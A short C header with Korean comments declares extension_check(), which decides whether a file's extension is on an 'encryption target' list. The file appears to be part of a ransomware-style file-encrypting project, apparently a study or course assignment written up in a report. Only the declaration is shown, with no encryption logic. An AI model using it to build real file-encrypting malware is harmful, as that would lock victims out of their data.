// extension.h
#ifndef EXTENSION_H
#define EXTENSION_H
#include <stdbool.h>

/*
 * extension_check()
 *
 * TODO:
 *  - 인자로 받은 전체 경로(filepath) 문자열에서 확장자를 추출,
 *    "암호화 대상 확장자 목록"과 비교하여 대상이면 true, 아니면 false를 반환.
 *  - 실제 확장자 리스트는 extension.c 의 g_target_exts[] 배열에 정의.
 *  - 보고서/발표에서:
 *      * "어떤 파일 형식을 목표로 했는지"를 설명할 때 이 리스트를 기준으로 작성.
 */
bool extension_check(const char *filepath);

#endif

